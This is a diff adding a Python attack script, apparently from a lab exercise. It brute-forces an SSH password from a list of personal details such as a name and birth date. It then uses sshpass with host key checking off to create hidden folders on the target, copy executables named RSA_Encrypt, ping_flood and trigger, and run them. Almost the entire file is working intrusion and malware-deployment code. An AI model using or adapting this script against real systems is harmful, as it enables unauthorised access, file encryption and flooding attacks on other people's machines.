@@ -1,0 +1,78 @@
+#!/usr/bin/env python
+import paramiko, sys, os, socket
+import itertools,string,crypt
+
+USER = "attacker"
+PORT = 22
+def dictionary(IP,Password):
+   try:
+      ssh = paramiko.SSHClient()
+      ssh.load_system_host_keys()
+      ssh.set_missing_host_key_policy(paramiko.MissingHostKeyPolicy())
+      try:
+         ssh.connect(IP , port=PORT, username=USER, password=Password)
+         print ("Connected success. Password= " + Password)
+         return 1,Password
+      except (paramiko.AuthenticationException):
+         #print ("Incorrect Password")
+         pass
+      except (socket.error):
+        #print (error)
+         pass
+      except (paramiko.SSHException):
+         #print (error)
+         print ("Most probably caused by a missing host  key")
+         pass
+      except Exception:
+         print ("Unknown error ")
+         pass
+      ssh.close()
+   except Exception :
+      print("fail to create ssh client")
+   return 0, ""
+
+
+# Step0 : launch a dictionary attack to get the password
+infos = ["YueHan","Wang","YH","1999","0228","oscar","Realtek","@","_"]
+IP = sys.argv[1]
+host_IP = "192.168.80.139"
+Password = ""
+stop = 0
+for i in range (0,8):
+   Password = infos[i]
+   for j in range (0,8):
+      Password = infos[i] + infos[j]
+      stop,record = dictionary(IP,Password)
+      if(stop == 1):
+         break
+   if(stop == 1):
+      break
+
+# Info
+USERIP = f'{USER}@{IP}'
+H = '/home/attacker/Desktop/.H'
+BACKUP = '/home/attacker/Desktop/.Backup'
+sshcmd = f'sshpass -p {record} ssh -o StrictHostKeyCHecking=no '
+scpcmd = f'sshpass -p {record} scp -o StrictHostKeyCHecking=no '\
+       + '{filename} ' + USERIP + ':{desktopPath}'
+chmodcmd = sshcmd + USERIP + 'chmod +x {desktopPath}/{filename}'
+
+# Step1 : mkdir : Desktop/.H and Desktop/.Backup
+os.system(sshcmd + f'{USERIP} mkdir {H}')
+os.system(sshcmd + f'{USERIP} mkdir {BACKUP}')
+
+# Step2 : copy and allow executable permissions to files
+filesH = ["trigger2", "RSA_Encrypt", "rsa_encrypt", "Loop_ping", "ping_flood"]
+filesBackup = ["trigger1", "RSA_Encrypt", "rsa_encrypt1", "Loop_ping", "ping_flood1"]
+for fh, fb in zip(filesH, filesBackup):
+   # ./H
+   os.system(scpcmd.format(filename=fh, desktopPath = H))
+   os.system(chmodcmd.format(filename=fh, desktopPath = H))
+   # /.Backup
+   os.system(scpcmd.format(filename=fb, desktopPath = BACKUP))
+   os.system(chmodcmd.format(filename=fb, desktopPath = BACKUP))
+
+# Step3 : trigger
+os.system(sshcmd + f'{USERIP} {H}/trigger2')
+os.system(sshcmd + f'{USERIP} {BACKUP}/trigger1')
+
